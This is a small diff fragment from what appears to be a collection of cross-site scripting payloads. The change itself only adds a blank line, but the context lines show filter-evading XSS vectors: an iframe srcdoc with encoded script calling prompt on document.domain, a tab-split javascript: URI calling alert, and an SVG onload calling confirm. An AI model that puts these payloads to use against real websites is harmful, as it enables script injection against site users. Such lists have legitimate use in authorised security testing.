@@ -15,6 +15,7 @@ xss'''><iframe srcdoc='%26it;script>;prompt`
 ${document.domain}`%26it;/script>'>
 <iframe src=java&Tab;sc&Tab;ript:al&Tab;ert()></iframe>
 
+
 <sVg/onLy=1 onLoaD=confirm(1)//
 
 <?xml version="1.0" standalone="no"?>
